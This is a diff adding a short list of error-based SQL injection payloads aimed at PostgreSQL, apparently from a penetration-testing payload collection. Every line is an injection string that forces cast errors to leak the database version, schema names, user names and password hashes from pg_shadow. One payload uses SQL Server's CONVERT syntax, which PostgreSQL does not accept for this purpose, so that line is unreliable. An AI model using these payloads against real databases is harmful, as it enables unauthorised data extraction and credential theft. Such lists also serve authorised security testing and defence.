@@ -1,0 +1,15 @@
+# PostgreSQL — Error-Based Payloads
+
+# --- CAST errors ---
+' AND CAST(version() AS int)--
+' AND 1=CAST(version() AS int)--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+' AND 1=CAST((SELECT column_name FROM information_schema.columns LIMIT 1) AS int)--
+' AND 1=CAST((SELECT usename FROM pg_user LIMIT 1) AS int)--
+' AND 1=CAST((SELECT passwd FROM pg_shadow LIMIT 1) AS int)--
+
+# --- CONVERT errors ---
+' AND CONVERT(int,(SELECT version()))--
+
+# --- Operator errors ---
+' AND 1=(SELECT 1 FROM pg_user WHERE usename=CAST(version() AS name))--
